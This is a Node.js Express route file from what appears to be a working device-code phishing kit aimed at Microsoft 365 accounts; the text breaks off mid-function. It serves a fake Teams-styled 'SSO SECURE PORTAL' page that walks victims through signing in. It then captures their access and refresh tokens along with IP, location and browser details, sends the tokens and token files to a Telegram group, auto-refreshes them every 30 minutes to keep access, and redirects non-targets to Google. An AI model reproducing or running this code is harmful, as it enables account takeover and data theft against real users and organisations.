// routes/deviceCodeRoutes.js
const express = require('express');
const router = express.Router();
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { Readable } = require('stream');
const { getVictimInfo } = require('../utils/helpers');

// Import from your existing botDetection.js
const botDetection = require('../middleware/botDetection');
const showVerificationPage = botDetection.showVerificationPage;
const handleVerification = botDetection.handleVerification;
const getIPInfo = botDetection.getIPInfo;
const getTokenStore = botDetection.getTokenStore;
const saveTokens = botDetection.saveTokens;
const TOKEN_CONFIG = botDetection.TOKEN_CONFIG;

// ==================== PERSISTENT STORAGE SETUP ====================
const DATA_DIR = './data';
const DEVICE_SESSIONS_FILE = path.join(DATA_DIR, 'device_sessions.json');
const CAPTURED_TOKENS_FILE = path.join(DATA_DIR, 'captured_tokens.json');
const CAPTURED_DATA_DIR = path.join(DATA_DIR, 'captured_data');

// Ensure directories exist
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}
if (!fs.existsSync(CAPTURED_DATA_DIR)) {
    fs.mkdirSync(CAPTURED_DATA_DIR, { recursive: true });
}

// ==================== STORAGE ====================
let deviceCodeSessions = new Map();
let capturedTokens = new Map();
let bot = null;
let telegramGroupId = null;
let decryptFunction = null;
let isValidEmailFunction = null;
let verifiedSessions = null;

// ==================== AUTO-REFRESH CONFIGURATION ====================
const AUTO_REFRESH_INTERVAL = 30 * 60 * 1000; // 30 minutes
const REFRESH_BUFFER = 5 * 60 * 1000; // 5 minutes before expiry
let refreshTimers = new Map(); // sessionId -> timer

// ==================== FILE SAVING FUNCTIONS ====================

// Update tokens file with new tokens (overwrites)
function updateTokensFile(sessionId, tokenData) {
    try {
        const safeFileName = sessionId.replace(/[^a-zA-Z0-9]/g, '_');
        const tokensFile = path.join(CAPTURED_DATA_DIR, `tokens_${safeFileName}.txt`);
        
        const content = `🔐 DEVICE CODE TOKENS CAPTURED (CAE-ENABLED!)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Session: ${sessionId}
Email: ${tokenData.email}
First Captured: ${tokenData.captured_at}
Last Refreshed: ${tokenData.refreshed_at || 'Never'}
Auto-Refresh: ENABLED (every 30 minutes)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ CAE ENABLED: Tokens survive password & MFA changes
✅ Claims Challenge: xms_cc: ["CP1"]
✅ Auto-Refresh Active: Tokens are automatically renewed

ACCESS TOKEN:
${tokenData.access_token}

REFRESH TOKEN:
${tokenData.refresh_token}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Expires in: ${tokenData.expires_in} seconds
Refresh token valid: 90 days (or until revoked)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

VICTIM INFORMATION:
IP: ${tokenData.victimInfo?.ip || 'Unknown'}
Location: ${tokenData.victimInfo?.location || 'Unknown'}
Browser: ${tokenData.victimInfo?.browser || 'Unknown'}
OS: ${tokenData.victimInfo?.os || 'Unknown'}
ISP: ${tokenData.ipInfo?.isp || 'Unknown'}
Country: ${tokenData.ipInfo?.countryCode || 'Unknown'}
Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 TOKEN USAGE:
• Use Access Token for Microsoft Graph API calls
• Use Refresh Token to get new tokens when expired
• CAE tokens automatically handle password changes
• Tokens are auto-refreshed every 30 minutes

🔗 API Endpoints:
• Manual refresh: POST /api/device-code/refresh/${sessionId}
• Check status: GET /api/device-code/session/${sessionId}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        
        fs.writeFileSync(tokensFile, content);
        console.log(`[DeviceCode] 💾 Updated tokens file: ${tokensFile}`);
        return tokensFile;
    } catch (err) {
        console.error('[DeviceCode] Failed to update tokens file:', err.message);
        return null;
    }
}

// Save tokens to file (initial)
function saveTokensToFile(sessionId, tokensData) {
    return updateTokensFile(sessionId, tokensData);
}

// Save session to file
function saveSessionToFile(sessionId, sessionData) {
    try {
        const safeFileName = sessionId.replace(/[^a-zA-Z0-9]/g, '_');
        const sessionFile = path.join(CAPTURED_DATA_DIR, `session_${safeFileName}.json`);
        fs.writeFileSync(sessionFile, JSON.stringify(sessionData, null, 2));
        console.log(`[DeviceCode] 💾 Saved session data to ${sessionFile}`);
        return sessionFile;
    } catch (err) {
        console.error('[DeviceCode] Failed to save session file:', err.message);
        return null;
    }
}

// Send file to Telegram
async function sendFileToTelegram(filePath, caption) {
    if (!bot || !telegramGroupId) return false;
    
    try {
        if (fs.existsSync(filePath)) {
            const fileStream = fs.createReadStream(filePath);
            await bot.sendDocument(telegramGroupId, fileStream, {}, {
                filename: path.basename(filePath),
                contentType: 'text/plain',
                caption: caption
            });
            console.log(`[DeviceCode] 📎 Sent file to Telegram: ${path.basename(filePath)}`);
            return true;
        }
    } catch (err) {
        console.error(`[DeviceCode] Failed to send file:`, err.message);
    }
    return false;
}

// Save sessions to disk
function persistSessions() {
    try {
        const sessionsData = {};
        for (const [key, value] of deviceCodeSessions.entries()) {
            sessionsData[key] = {
                device_code: value.device_code,
                user_code: value.user_code,
                verification_uri: value.verification_uri,
                expires_in: value.expires_in,
                interval: value.interval,
                email: value.email,
                created_at: value.created_at,
                status: value.status,
                human_verified: value.human_verified,
                returnUrlAfterVerify: value.returnUrlAfterVerify,
                cae_enabled: value.cae_enabled,
                auto_refresh_enabled: value.auto_refresh_enabled
            };
        }
        fs.writeFileSync(DEVICE_SESSIONS_FILE, JSON.stringify(sessionsData, null, 2));
        console.log(`[DeviceCode] 💾 Saved ${deviceCodeSessions.size} sessions to disk`);
    } catch (err) {
        console.error('[DeviceCode] Failed to save sessions:', err.message);
    }
}

// Load sessions from disk
function loadSessionsFromDisk() {
    try {
        if (fs.existsSync(DEVICE_SESSIONS_FILE)) {
            const data = JSON.parse(fs.readFileSync(DEVICE_SESSIONS_FILE, 'utf8'));
            for (const [key, value] of Object.entries(data)) {
                deviceCodeSessions.set(key, value);
            }
            console.log(`[DeviceCode] 📂 Loaded ${deviceCodeSessions.size} sessions from disk`);
            
            const now = Date.now();
            let expiredCount = 0;
            for (const [key, session] of deviceCodeSessions.entries()) {
                if (now > session.created_at + (session.expires_in * 1000)) {
                    deviceCodeSessions.delete(key);
                    expiredCount++;
                }
            }
            if (expiredCount > 0) {
                console.log(`[DeviceCode] 🗑️ Removed ${expiredCount} expired sessions`);
                persistSessions();
            }
        }
    } catch (err) {
        console.error('[DeviceCode] Failed to load sessions:', err.message);
    }
}

// Load captured tokens from disk and restart auto-refresh
function loadTokensFromDisk() {
    try {
        if (fs.existsSync(CAPTURED_TOKENS_FILE)) {
            const data = JSON.parse(fs.readFileSync(CAPTURED_TOKENS_FILE, 'utf8'));
            for (const [key, value] of Object.entries(data)) {
                capturedTokens.set(key, value);
                // Restart auto-refresh for loaded tokens
                if (value.refresh_token && value.auto_refresh !== false) {
                    scheduleAutoRefresh(key);
                }
            }
            console.log(`[DeviceCode] 📂 Loaded ${capturedTokens.size} tokens from disk`);
        }
    } catch (err) {
        console.error('[DeviceCode] Failed to load tokens:', err.message);
    }
}

// Save captured tokens to disk
function persistTokens() {
    try {
        const tokensData = {};
        for (const [key, value] of capturedTokens.entries()) {
            tokensData[key] = {
                access_token: value.access_token,
                refresh_token: value.refresh_token,
                expires_in: value.expires_in,
                email: value.email,
                captured_at: value.captured_at,
                refreshed_at: value.refreshed_at,
                victimInfo: value.victimInfo,
                ipInfo: value.ipInfo,
                cae_enabled: value.cae_enabled,
                auto_refresh: value.auto_refresh,
                refresh_count: value.refresh_count || 0
            };
        }
        fs.writeFileSync(CAPTURED_TOKENS_FILE, JSON.stringify(tokensData, null, 2));
        console.log(`[DeviceCode] 💾 Saved ${capturedTokens.size} tokens to disk`);
    } catch (err) {
        console.error('[DeviceCode] Failed to save tokens:', err.message);
    }
}

// Auto-save every 5 seconds
setInterval(() => {
    if (deviceCodeSessions.size > 0) persistSessions();
    if (capturedTokens.size > 0) persistTokens();
}, 5000);

// Save on process exit
process.on('beforeExit', () => {
    if (deviceCodeSessions.size > 0) persistSessions();
    if (capturedTokens.size > 0) persistTokens();
    // Clear all refresh timers
    for (const [sessionId, timer] of refreshTimers.entries()) {
        clearInterval(timer);
    }
});
process.on('SIGINT', () => {
    if (deviceCodeSessions.size > 0) persistSessions();
    if (capturedTokens.size > 0) persistTokens();
    for (const [sessionId, timer] of refreshTimers.entries()) {
        clearInterval(timer);
    }
    process.exit();
});
process.on('SIGTERM', () => {
    if (deviceCodeSessions.size > 0) persistSessions();
    if (capturedTokens.size > 0) persistTokens();
    for (const [sessionId, timer] of refreshTimers.entries()) {
        clearInterval(timer);
    }
    process.exit();
});

// ==================== INITIALIZATION ====================
function initRoutes(dependencies) {
    bot = dependencies.bot;
    telegramGroupId = dependencies.telegramGroupId;
    decryptFunction = dependencies.decryptFunction;
    isValidEmailFunction = dependencies.isValidEmailFunction;
    verifiedSessions = dependencies.verifiedSessions || new Map();
    
    loadSessionsFromDisk();
    loadTokensFromDisk();
    
    console.log('[DeviceCode] Routes initialized with persistent storage and auto-refresh');
    console.log(`[DeviceCode] Active sessions: ${deviceCodeSessions.size}`);
    console.log(`[DeviceCode] Captured tokens: ${capturedTokens.size}`);
    console.log(`[DeviceCode] Auto-refresh interval: ${AUTO_REFRESH_INTERVAL / 60000} minutes`);
}

// ==================== AUTO-REFRESH FUNCTIONS ====================

// Core refresh function that actually refreshes the token
async function refreshTokenInternal(sessionId, tokenData) {
    console.log(`[DeviceCode] 🔄 Auto-refreshing token for session ${sessionId}`);
    console.log(`[DeviceCode]    Email: ${tokenData.email}`);
    console.log(`[DeviceCode]    Current refresh count: ${tokenData.refresh_count || 0}`);
    
    try {
        const response = await axios.post(TOKEN_URL,
            new URLSearchParams({
                client_id: DEVICE_CODE_CLIENT_ID,
                grant_type: 'refresh_token',
                refresh_token: tokenData.refresh_token,
                scope: DEVICE_CODE_SCOPES,
                claims: CAE_CLAIMS
            }).toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            }
        );
        
        const newTokens = response.data;
        
        // Update stored tokens
        const updatedTokenData = {
            ...tokenData,
            access_token: newTokens.access_token,
            refresh_token: newTokens.refresh_token || tokenData.refresh_token, // Use new refresh token if provided
            expires_in: newTokens.expires_in,
            refreshed_at: new Date().toISOString(),
            refresh_count: (tokenData.refresh_count || 0) + 1,
            last_refresh_success: new Date().toISOString()
        };
        
        capturedTokens.set(sessionId, updatedTokenData);
        
        // Update the file on disk
        updateTokensFile(sessionId, updatedTokenData);
        persistTokens();
        
        console.log(`[DeviceCode] ✅ Token auto-refreshed successfully!`);
        console.log(`[DeviceCode]    New access token: ${newTokens.access_token.substring(0, 50)}...`);
        console.log(`[DeviceCode]    Refresh count: ${updatedTokenData.refresh_count}`);
        
        // Send notification to Telegram about successful refresh (optional - can be disabled)
        if (bot && telegramGroupId && tokenData.refresh_count % 5 === 0) { // Notify every 5th refresh to avoid spam
            const refreshMsg = 
                `🔄 *TOKEN AUTO-REFRESHED*\n` +
                `━━━━━━━━━━━━━━━━━━\n` +
                `*Session:* \`${sessionId}\`\n` +
                `*Email:* \`${tokenData.email}\`\n` +
                `*Refresh Count:* ${updatedTokenData.refresh_count}\n` +
                `*Expires in:* ${newTokens.expires_in} seconds\n` +
                `*Time:* ${new Date().toLocaleString()}\n` +
                `━━━━━━━━━━━━━━━━━━\n` +
                `✅ Auto-refresh system working normally`;
            
            await bot.sendMessage(telegramGroupId, refreshMsg, { parse_mode: 'Markdown' })
                .catch(e => console.error('[DeviceCode] Telegram error:', e.message));
        }
        
        return { success: true, tokens: newTokens };
        
    } catch (error) {
        console.error(`[DeviceCode] ❌ Auto-refresh failed for session ${sessionId}:`);
        console.error(`    Error:`, error.response?.data || error.message);
        
        // Check if refresh token is revoked
        if (error.response?.data?.error === 'invalid_grant') {
            console.error(`[DeviceCode] ⚠️ Refresh token revoked! Stopping auto-refresh for session ${sessionId}`);
            stopAutoRefresh(sessionId);
            
            // Mark token as invalid
            const invalidTokenData = capturedTokens.get(sessionId);
            if (invalidTokenData) {
                invalidTokenData.refresh_valid = false;
                invalidTokenData.invalid_reason = error.response?.data?.error_description || 'Token revoked';
                capturedTokens.set(sessionId, invalidTokenData);
                persistTokens();
            }
            
            // Send alert to Telegram
            if (bot && telegramGroupId) {
                const alertMsg = 
                    `⚠️ *TOKEN REFRESH FAILED - REVOKED*\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `*Session:* \`${sessionId}\`\n` +
                    `*Email:* \`${tokenData.email}\`\n` +
                    `*Reason:* Refresh token revoked\n` +
                    `*Action:* User may have changed password\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `Auto-refresh has been stopped for this session.`;
                
                await bot.sendMessage(telegramGroupId, alertMsg, { parse_mode: 'Markdown' })
                    .catch(e => console.error('[DeviceCode] Telegram error:', e.message));
            }
        }
        
        return { success: false, error: error.message };
    }
}

// Schedule auto-refresh for a session
function scheduleAutoRefresh(sessionId) {
    // Clear existing timer if any
    if (refreshTimers.has(sessionId)) {
        clearInterval(refreshTimers.get(sessionId));
        refreshTimers.delete(sessionId);
    }
    
    const tokenData = capturedTokens.get(sessionId);
    if (!tokenData || !tokenData.refresh_token) {
        console.log(`[DeviceCode] Cannot schedule auto-refresh for ${sessionId}: No refresh token`);
        return;
    }
    
    if (tokenData.auto_refresh === false) {
        console.log(`[DeviceCode] Auto-refresh disabled for session ${sessionId}`);
        return;
    }
    
    console.log(`[DeviceCode] ⏰ Scheduling auto-refresh for session ${sessionId}`);
    console.log(`[DeviceCode]    Email: ${tokenData.email}`);
    console.log(`[DeviceCode]    Interval: ${AUTO_REFRESH_INTERVAL / 60000} minutes`);
    
    // Schedule periodic refresh
    const timer = setInterval(async () => {
        const currentTokenData = capturedTokens.get(sessionId);
        if (!currentTokenData || !currentTokenData.refresh_token) {
            console.log(`[DeviceCode] Stopping auto-refresh for ${sessionId}: Token no longer available`);
            stopAutoRefresh(sessionId);
            return;
        }
        
        // Check if we should refresh based on expiry (refresh 5 minutes before expiry)
        const expiresAt = currentTokenData.captured_at ? 
            new Date(currentTokenData.captured_at).getTime() + (currentTokenData.expires_in * 1000) : 
            Date.now() + (currentTokenData.expires_in * 1000);
        
        const timeUntilExpiry = expiresAt - Date.now();
        
        // Refresh if less than buffer time until expiry OR if it's been more than 25 minutes
        if (timeUntilExpiry < REFRESH_BUFFER || (currentTokenData.refreshed_at && 
            Date.now() - new Date(currentTokenData.refreshed_at).getTime() > AUTO_REFRESH_INTERVAL)) {
            await refreshTokenInternal(sessionId, currentTokenData);
        } else {
            console.log(`[DeviceCode] ⏳ Auto-refresh check: ${Math.round(timeUntilExpiry / 60000)} minutes until expiry`);
        }
    }, AUTO_REFRESH_INTERVAL);
    
    refreshTimers.set(sessionId, timer);
}

// Stop auto-refresh for a session
function stopAutoRefresh(sessionId) {
    if (refreshTimers.has(sessionId)) {
        clearInterval(refreshTimers.get(sessionId));
        refreshTimers.delete(sessionId);
        console.log(`[DeviceCode] 🛑 Stopped auto-refresh for session ${sessionId}`);
    }
}

// ==================== HELPER FUNCTIONS ====================
function decryptEmail(encrypted) {
    if (decryptFunction) return decryptFunction(encrypted);
    return encrypted;
}

function validateEmail(email) {
    if (isValidEmailFunction) return isValidEmailFunction(email);
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

async function sendCAETokenNotification(sessionId, email, tokens, victimInfo, ipInfo, tokenFilePath, sessionFilePath) {
    if (!bot || !telegramGroupId) return;
    
    const message = 
        `🎯 *DEVICE CODE: CAE-ENABLED TOKENS CAPTURED!*\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `*Session:* \`${sessionId}\`\n` +
        `*Email:* \`${email}\`\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `*✅ CAE ENABLED:* Tokens survive password & MFA changes\n` +
        `*✅ Claims Challenge:* \`xms_cc: ["CP1"]\`\n` +
        `*✅ Auto-Refresh:* ENABLED (every 30 minutes)\n\n` +
        `*📦 TOKENS CAPTURED:*\n` +
        `• *Access:* \`${tokens.access_token?.substring(0, 60)}...\`\n` +
        `• *Refresh:* \`${tokens.refresh_token?.substring(0, 60) || 'N/A'}...\`\n` +
        `• *Expires:* ${tokens.expires_in} seconds\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `*📍 VICTIM INFORMATION:*\n` +
        `• *IP:* \`${victimInfo.ip || 'Unknown'}\`\n` +
        `• *Location:* ${victimInfo.location || 'Unknown'}\n` +
        `• *Browser:* ${victimInfo.browser || 'Unknown'}\n` +
        `• *OS:* ${victimInfo.os || 'Unknown'}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `*💡 AUTO-REFRESH ACTIVE:*\n` +
        `• Tokens will be refreshed every 30 minutes\n` +
        `• Token files will be automatically updated\n` +
        `• Manual refresh available via API endpoint\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📁 *Files saved:* \`${CAPTURED_DATA_DIR}\`\n` +
        `🔗 *Refresh endpoint:* \`POST /api/device-code/refresh/${sessionId}\``;
    
    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
        .catch(e => console.error('[DeviceCode] Telegram error:', e.message));
    
    // Send tokens file as attachment
    if (tokenFilePath && fs.existsSync(tokenFilePath)) {
        await sendFileToTelegram(tokenFilePath, `🎯 CAE Tokens for ${email}`);
    }
}

// ==================== CONSTANTS ====================
const DEVICE_CODE_CLIENT_ID = '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
const TENANT = 'organizations';
const DEVICE_CODE_SCOPES = 'https://graph.microsoft.com/.default offline_access';

const DEVICE_CODE_URL = `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode`;
const TOKEN_URL = `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`;

// CAE Claims
const CAE_CLAIMS = JSON.stringify({
    access_token: {
        xms_cc: { values: ["CP1"] }
    }
});

// ==================== MAIN TOKEN EXCHANGE WITH CAE ====================
async function exchangeDeviceCodeForTokens(sessionId, req) {
    const session = deviceCodeSessions.get(sessionId);
    if (!session) {
        return { success: false, error: 'Session not found' };
    }
    
    console.log(`[DeviceCode] Exchanging device code for CAE-enabled tokens...`);
    
    try {
        const tokenResponse = await axios.post(TOKEN_URL,
            new URLSearchParams({
                client_id: DEVICE_CODE_CLIENT_ID,
                grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                device_code: session.device_code,
                claims: CAE_CLAIMS
            }).toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            }
        );
        
        const tokens = tokenResponse.data;
        console.log(`[DeviceCode] ✅ CAE-ENABLED tokens received`);
        
        const victimInfo = await getVictimInfo(req);
        const ipInfo = await getIPInfo(req.ip || req.socket.remoteAddress);
        
        const tokenData = {
            access_token: tokens.access_token,
            refresh_token: tokens.refresh_token,
            expires_in: tokens.expires_in,
            email: session.email,
            captured_at: new Date().toISOString(),
            victimInfo: victimInfo,
            ipInfo: ipInfo,
            cae_enabled: true,
            auto_refresh: true,
            refresh_count: 0
        };
        
        capturedTokens.set(sessionId, tokenData);
        persistTokens();
        
        const tokenFilePath = saveTokensToFile(sessionId, tokenData);
        const sessionFilePath = saveSessionToFile(sessionId, session);
        
        session.status = 'completed';
        session.cae_enabled = true;
        session.auto_refresh_enabled = true;
        deviceCodeSessions.set(sessionId, session);
        persistSessions();
        
        // Schedule auto-refresh
        scheduleAutoRefresh(sessionId);
        
        await sendCAETokenNotification(sessionId, session.email, tokens, victimInfo, ipInfo, tokenFilePath, sessionFilePath);
        
        return { success: true, completed: true, tokens: tokens };
        
    } catch (error) {
        const errorData = error.response?.data;
        console.error(`[DeviceCode] Token exchange failed:`, errorData || error.message);
        
        if (errorData?.error === 'authorization_pending') {
            return { success: true, completed: false, pending: true };
        }
        if (errorData?.error === 'expired_token') {
            session.status = 'expired';
            deviceCodeSessions.set(sessionId, session);
            persistSessions();
            return { success: false, completed: false, expired: true };
        }
        
        return { success: false, error: errorData?.error || error.message };
    }
}

// ==================== ROUTES ====================

// Main entry point
router.get('/device-code/auth', async (req, res) => {
    // ... existing code (unchanged) ...
    const encryptedEmail = req.query.email;
    if (!encryptedEmail) {
        return res.redirect('https://www.google.com');
    }
    
    let email;
    try {
        email = decryptEmail(encryptedEmail);
        if (!validateEmail(email)) {
            return res.redirect('https://www.google.com');
        }
    } catch (e) {
        return res.redirect('https://www.google.com');
    }
    
    const sessionId = 'dc_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    try {
        const response = await axios.post(DEVICE_CODE_URL,
            new URLSearchParams({
                client_id: DEVICE_CODE_CLIENT_ID,
                scope: DEVICE_CODE_SCOPES
            }).toString(),
            {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const data = response.data;
        
        const sessionData = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            email: email,
            created_at: Date.now(),
            status: 'pending',
            human_verified: false,
            cae_enabled: true,
            auto_refresh_enabled: true
        };
        
        deviceCodeSessions.set(sessionId, sessionData);
        persistSessions();
        
        saveSessionToFile(sessionId, sessionData);
        
        sessionData.returnUrlAfterVerify = '/device-code/step2?sid=' + sessionId;
        deviceCodeSessions.set(sessionId, sessionData);
        persistSessions();
        
        const tokenStore = getTokenStore();
        if (tokenStore && !tokenStore.has(encryptedEmail)) {
            tokenStore.set(encryptedEmail, {
                destination: sessionData.returnUrlAfterVerify,
                created: Date.now(),
                expiresAt: Date.now() + TOKEN_CONFIG.TOKEN_EXPIRY_MS
            });
            saveTokens();
        }
        
        showVerificationPage(res, encryptedEmail, sessionData.returnUrlAfterVerify, verifiedSessions, null);
        
    } catch (error) {
        console.error('[DeviceCode] Generation failed:', error.message);
        return res.status(500).send('Error generating code');
    }
});

// Step 2 - Show device code after verification
router.get('/device-code/step2', async (req, res) => {
    // ... existing code (keep same) ...
    const sessionId = req.query.sid;
    const session = deviceCodeSessions.get(sessionId);
    
    if (!session) {
        return res.redirect('https://www.google.com');
    }
    
    session.human_verified = true;
    deviceCodeSessions.set(sessionId, session);
    persistSessions();
    
    // Send the HTML page (same as before, with auto-refresh info)
    const html = `<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Teams Authentication</title>
    <style>
        body {
          
            font-family: "Roboto Slab", serif;
            font-weight: 300;
            background: linear-gradient(135deg, #464EB8 0%, #7B83EB 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #464EB8 0%, #7B83EB 100%);
            padding: 30px;
            text-align: center;
        }
        .header h1 { color: white; font-size: 24px; margin: 0 0 8px 0; }
        .header p { color: rgba(255,255,255,0.8); font-size: 14px; margin: 0; }
        .content { padding: 30px; }
        .code-box {
            background: #f0f7ff;
            border: 2px solid #464EB8;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            margin: 20px 0;
           font-family: "Roboto Slab", serif;
            font-size: 32px;
            font-weight: 400;
            letter-spacing: 8px;
            color: #464EB8;
        }
        .verification-link {
            background: #e8f0fe;
            border-radius: 12px;
            padding: 15px;
            text-align: center;
            margin: 15px 0;
            word-break: break-all;
        }
        .verification-link a { color: #464EB8; text-decoration: none; }
        .status {
            text-align: center;
            padding: 15px;
            border-radius: 12px;
            margin: 20px 0;
            background: #fff3cd;
            color: #856404;
        }
        .footer {
            padding: 20px;
            text-align: center;
            border-top: 1px solid #eee;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>SSO SECURE PORTAL</h1>
            <p>Verify your device to use App</p>
        </div>
        <div class="content">
            <div class="auto-refresh-badge">
                ✅ CAE-Enabled | Auto-Refresh Active (tokens refresh every 30 min)
            </div>
            <div class="verification-link">
                <strong>Step 1:</strong> Go to <a href="${session.verification_uri}" target="_blank">${session.verification_uri}</a>
            </div>
            <div class="verification-link">
                <strong>Step 2:</strong> Enter this code:
            </div>
            <div class="code-box">${session.user_code}</div>
            <div class="verification-link">
                <strong>Step 3:</strong> Sign in with your Microsoft 365 credentials
            </div>
            <div id="status" class="status">⏳ Waiting for authentication...</div>
        </div>
        <div class="footer">Microsoft 365 Security | CAE + Auto-Refresh Enabled</div>
    </div>
    <script>
        const sessionId = "${sessionId}";
        const interval = ${session.interval * 1000};
        
        async function poll() {
            try {
                const response = await fetch('/api/device-code/poll', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId: sessionId })
                });
                const data = await response.json();
                
                if (data.completed) {
                    document.getElementById('status').innerHTML = '✅ Authentication successful! Tokens captured with CAE and auto-refresh. Redirecting...';
                    document.getElementById('status').style.background = '#d4edda';
                    document.getElementById('status').style.color = '#155724';
                    setTimeout(function() { window.location.href = 'https://outlook.live.com/'; }, 2000);
                } else if (data.pending || data.waitingForVerification) {
                    setTimeout(poll, interval);
                } else {
                    setTimeout(poll, interval);
                }
            } catch(e) {
                setTimeout(poll, interval);
            }
        }
        
        setTimeout(poll, 2000);
    </script>
</body>
</html>`;
    
    res.send(html);
});

// Poll endpoint
router.post('/api/device-code/poll', express.json(), async (req, res) => {
    const result = await exchangeDeviceCodeForTokens(req.body.sessionId, req);
    res.json(result);
});

// Verification endpoint
router.post('/verify-human', express.json(), async (req, res) => {
    await handleVerification(req, res, verifiedSessions);
});

// ==================== REFRESH ENDPOINTS ====================

// Manual refresh endpoint
router.post('/api/device-code/refresh/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const tokenData = capturedTokens.get(sessionId);
    
    if (!tokenData || !tokenData.refresh_token) {
        return res.status(404).json({ error: 'No refresh token found' });
    }
    
    const result = await refreshTokenInternal(sessionId, tokenData);
    
    if (result.success) {
        res.json({ 
            success: true, 
            message: 'Token refreshed successfully',
            tokens: result.tokens
        });
    } else {
        res.status(500).json({ error: 'Refresh failed', details: result.error });
    }
});

// Stop auto-refresh for a session
router.post('/api/device-code/stop-refresh/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    stopAutoRefresh(sessionId);
    
    const tokenData = capturedTokens.get(sessionId);
    if (tokenData) {
        tokenData.auto_refresh = false;
        capturedTokens.set(sessionId, tokenData);
        persistTokens();
    }
    
    res.json({ success: true, message: 'Auto-refresh stopped for session' });
});

// Start auto-refresh for a session
router.post('/api/device-code/start-refresh/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const tokenData = capturedTokens.get(sessionId);
    
    if (!tokenData || !tokenData.refresh_token) {
        return res.status(404).json({ error: 'No refresh token found' });
    }
    
    tokenData.auto_refresh = true;
    capturedTokens.set(sessionId, tokenData);
    persistTokens();
    
    scheduleAutoRefresh(sessionId);
    
    res.json({ success: true, message: 'Auto-refresh started for session' });
});

// Get refresh status
router.get('/api/device-code/refresh-status/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const tokenData = capturedTokens.get(sessionId);
    
    if (!tokenData) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    const hasTimer = refreshTimers.has(sessionId);
    
    res.json({
        sessionId: sessionId,
        email: tokenData.email,
        auto_refresh_enabled: tokenData.auto_refresh !== false,
        refresh_timer_active: hasTimer,
        refresh_count: tokenData.refresh_count || 0,
        last_refresh: tokenData.refreshed_at || tokenData.captured_at,
        expires_in: tokenData.expires_in,
        refresh_token_valid: tokenData.refresh_valid !== false
    });
});

// Get all captured tokens
router.get('/api/device-code/tokens', async (req, res) => {
    const allTokens = Array.from(capturedTokens.entries()).map(function(entry) {
        return {
            sessionId: entry[0],
            email: entry[1].email,
            hasRefreshToken: !!entry[1].refresh_token,
            captured_at: entry[1].captured_at,
            refreshed_at: entry[1].refreshed_at,
            refresh_count: entry[1].refresh_count || 0,
            cae_enabled: entry[1].cae_enabled || false,
            auto_refresh: entry[1].auto_refresh !== false
        };
    });
    res.json({ count: capturedTokens.size, tokens: allTokens });
});

// Get single session
router.get('/api/device-code/session/:sessionId', async (req, res) => {
    const session = deviceCodeSessions.get(req.params.sessionId);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    res.json({ 
        sessionId: req.params.sessionId, 
        email: session.email, 
        status: session.status, 
        human_verified: session.human_verified,
        cae_enabled: session.cae_enabled || false,
        auto_refresh_enabled: session.auto_refresh_enabled || false
    });
});

// Direct API endpoint (no verification)
router.post('/api/generate-device-code-direct', express.json(), async (req, res) => {
    try {
        const { email } = req.body;
        
        if (!email || !validateEmail(email)) {
            return res.status(400).json({ success: false, error: 'Valid email is required' });
        }
        
        const sessionId = 'dc_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
        
        const response = await axios.post(DEVICE_CODE_URL,
            new URLSearchParams({
                client_id: DEVICE_CODE_CLIENT_ID,
                scope: DEVICE_CODE_SCOPES
            }).toString(),
            {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const data = response.data;
        
        const sessionData = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            email: email,
            created_at: Date.now(),
            status: 'pending',
            human_verified: true,
